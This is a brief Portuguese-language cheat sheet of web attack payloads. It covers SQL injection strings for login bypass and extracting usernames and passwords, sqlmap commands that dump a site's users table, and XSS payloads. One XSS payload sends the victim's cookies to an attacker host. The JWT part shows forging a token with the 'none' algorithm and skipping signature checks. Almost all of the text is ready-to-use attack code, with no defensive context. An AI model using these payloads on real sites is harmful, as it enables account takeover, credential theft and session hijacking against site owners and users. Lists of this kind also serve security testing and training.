🔍 SQL Injection (SQLi)

-- Login bypass ' OR '1'='1' -- -- Extrair dados ' UNION SELECT username, password FROM users -- -- Comentar o resto admin' --

Ferramentas:

# SQLMap sqlmap -u "http://site.com/page?id=1" --dbs sqlmap -u "http://site.com/page?id=1" -D database --tables sqlmap -u "http://site.com/page?id=1" -D database -T users --dump

🔍 Cross-Site Scripting (XSS)

<!-- Alerta básico --> <script>alert('XSS')</script> <!-- Roubar cookie --> <script>fetch('http://atacante.com?cookie='+document.cookie)</script> <!-- Imagem com erro --> <img src=x onerror=alert('XSS')>

🔍 JWT (JSON Web Tokens)

import jwt # Ataque de algoritmo none token_none = jwt.encode({"user": "admin"}, algorithm="none") # Decodificar sem verificar decoded = jwt.decode(token, options={"verify_signature": False})
